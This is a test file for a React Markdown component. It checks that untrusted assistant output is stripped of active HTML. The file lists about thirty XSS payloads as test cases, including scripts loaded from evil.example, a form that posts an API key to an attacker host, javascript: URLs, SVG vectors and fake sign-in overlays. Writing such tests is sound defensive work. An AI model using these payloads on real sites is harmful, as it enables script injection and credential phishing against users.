import { cleanup, render } from '@testing-library/react'
import { afterEach, describe, expect, it } from 'vitest'

import { Markdown } from '../markdown'

/**
 * ACTIVE_SELECTOR matches every element that can run script, load a foreign
 * document, submit data, restyle the page, or re-target relative URLs when it
 * is rendered from untrusted assistant output.
 */
const ACTIVE_SELECTOR = [
  'script',
  'iframe',
  'frame',
  'frameset',
  'object',
  'embed',
  'applet',
  'form',
  'button',
  'select',
  'textarea',
  'input:not([type="checkbox"])',
  'style',
  'link',
  'meta',
  'base',
  'svg',
  'math',
  'video',
  'audio',
  'portal',
  'template',
  'dialog',
].join(',')

/**
 * collectActive returns the tag names of dangerous elements rendered anywhere
 * in the document, including nodes React 19 hoists into document.head.
 */
function collectActive(container: HTMLElement): string[] {
  const found = new Set<string>()
  for (const node of container.querySelectorAll(ACTIVE_SELECTOR)) {
    // KaTeX emits trusted MathML for accessibility; only foreign math counts.
    if (node.closest('.katex')) continue
    found.add(node.tagName.toLowerCase())
  }
  for (const node of document.head.querySelectorAll(ACTIVE_SELECTOR)) {
    // Only head nodes that reference the payload host can come from markdown.
    if (attributeText(node).includes('evil.example')) {
      found.add(`head>${node.tagName.toLowerCase()}`)
    }
  }
  return [...found]
}

/** attributeText joins every attribute value of node for host matching. */
function attributeText(node: Element): string {
  return Array.from(node.attributes, (attr) => attr.value).join(' ')
}

/**
 * collectUnsafeAttributes returns attribute names that are executable or that
 * escape the markdown container's styling, such as inline event handlers,
 * inline styles, srcdoc, and form-submission targets.
 */
function collectUnsafeAttributes(container: HTMLElement): string[] {
  const found = new Set<string>()
  for (const node of container.querySelectorAll('*')) {
    if (node.closest('.katex')) continue
    for (const attr of Array.from(node.attributes)) {
      const name = attr.name.toLowerCase()
      if (
        name.startsWith('on') ||
        name === 'style' ||
        name === 'srcdoc' ||
        name === 'formaction' ||
        name === 'action' ||
        name === 'http-equiv'
      ) {
        found.add(`${node.tagName.toLowerCase()}[${name}]`)
      }
    }
  }
  return [...found]
}

/**
 * collectUnsafeUrls returns href/src values whose scheme can execute script or
 * smuggle an HTML document.
 */
function collectUnsafeUrls(container: HTMLElement): string[] {
  const found: string[] = []
  for (const node of container.querySelectorAll(
    '[href],[src],[xlink\\:href]',
  )) {
    for (const name of ['href', 'src', 'xlink:href']) {
      const value = (node.getAttribute(name) ?? '').trim().toLowerCase()
      if (!value) continue
      if (value.startsWith('javascript:') || value.startsWith('vbscript:')) {
        found.push(`${node.tagName.toLowerCase()}[${name}]`)
      }
      if (
        value.startsWith('data:') &&
        !/^data:image\/(png|jpe?g|gif|webp);/.test(value)
      ) {
        found.push(`${node.tagName.toLowerCase()}[${name}]`)
      }
    }
  }
  return found
}

const xssCases: Array<[string, string]> = [
  ['inline script', '<script>window.__xss = 1</script>'],
  [
    'async external script',
    '<script async src="https://evil.example/x.js"></script>',
  ],
  [
    'iframe srcdoc',
    '<iframe srcdoc="<script>parent.__xss = 1</script>"></iframe>',
  ],
  ['iframe src', '<iframe src="https://evil.example/phish"></iframe>'],
  ['object data', '<object data="https://evil.example/x.html"></object>'],
  ['embed src', '<embed src="https://evil.example/x.swf">'],
  [
    'form action with credential input',
    '<form action="https://evil.example/collect" method="post"><input name="api_key" type="password"><button>Verify</button></form>',
  ],
  [
    'button formaction',
    '<button formaction="https://evil.example/b">go</button>',
  ],
  [
    'img onerror',
    '<img src="https://example.com/x.png" onerror="window.__xss = 1">',
  ],
  ['div onclick', '<div onclick="window.__xss = 1">click me</div>'],
  ['raw anchor javascript', '<a href="javascript:window.__xss = 1">x</a>'],
  ['markdown link javascript', '[x](javascript:window.__xss=1)'],
  ['markdown angle link javascript', '[x](<javascript:window.__xss=1>)'],
  ['entity-encoded javascript', '<a href="&#106;avascript:alert(1)">x</a>'],
  ['mixed-case javascript', '<a href="JaVaScRiPt:alert(1)">x</a>'],
  ['padded javascript', '<a href="  javascript:alert(1)">x</a>'],
  ['img javascript', '<img src="javascript:alert(1)">'],
  [
    'details ontoggle',
    '<details open ontoggle="window.__xss = 1"><summary>s</summary>x</details>',
  ],
  [
    'checkbox autofocus onfocus',
    '<input type="checkbox" disabled autofocus onfocus="window.__xss = 1">',
  ],
  [
    'raw anchor data html',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  ],
  ['raw img data html', '<img src="data:text/html;base64,PHNjcmlwdD4=">'],
  ['svg script', '<svg><script>window.__xss = 1</script></svg>'],
  ['svg onload', '<svg onload="window.__xss = 1"><circle r="5"/></svg>'],
  [
    'svg animate href',
    '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text y="20">x</text></a></svg>',
  ],
  ['math xlink', '<math><mi xlink:href="javascript:alert(1)">x</mi></math>'],
  ['style element', '<style>body { display: none }</style>'],
  [
    'inline style overlay',
    '<div style="position:fixed;inset:0;z-index:9999;background:white">Session expired</div>',
  ],
  [
    'stylesheet link',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
  ],
  [
    'meta refresh',
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  ],
  ['base href', '<base href="https://evil.example/">'],
  ['textarea', '<textarea name="api_key">x</textarea>'],
  ['video onerror', '<video src="x" onerror="window.__xss = 1"></video>'],
  ['template', '<template><script>window.__xss = 1</script></template>'],
  ['dialog', '<dialog open>Re-enter your API key</dialog>'],
]

afterEach(() => {
  cleanup()
  for (const node of document.head.querySelectorAll('*')) {
    if (attributeText(node).includes('evil.example')) node.remove()
  }
})

describe('Markdown untrusted HTML sanitization', () => {
  it.each(xssCases)('neutralizes %s', (_name, payload) => {
    const source = `Here is the answer.\n\n${payload}\n\nThanks.`
    const { container } = render(<Markdown>{source}</Markdown>)

    expect(collectActive(container)).toEqual([])
    expect(collectUnsafeAttributes(container)).toEqual([])
    expect(collectUnsafeUrls(container)).toEqual([])
    expect(container.textContent).toContain('Here is the answer.')
    expect(container.textContent).toContain('Thanks.')
  })

  it('prefixes raw element ids so they cannot clobber page globals', () => {
    const { container } = render(
      <Markdown>{'<div id="root" name="config">x</div>'}</Markdown>,
    )
    expect(container.querySelector('#root')).toBeNull()
    expect(container.querySelector('[name="config"]')).toBeNull()
    expect(container.textContent).toContain('x')
  })

  it('drops raw class names that could reuse app styling for overlays', () => {
    const { container } = render(
      <Markdown>
        {'<div class="fixed inset-0 z-50 bg-background">Sign in again</div>'}
      </Markdown>,
    )
    expect(container.querySelector('.fixed')).toBeNull()
    expect(container.textContent).toContain('Sign in again')
  })
})
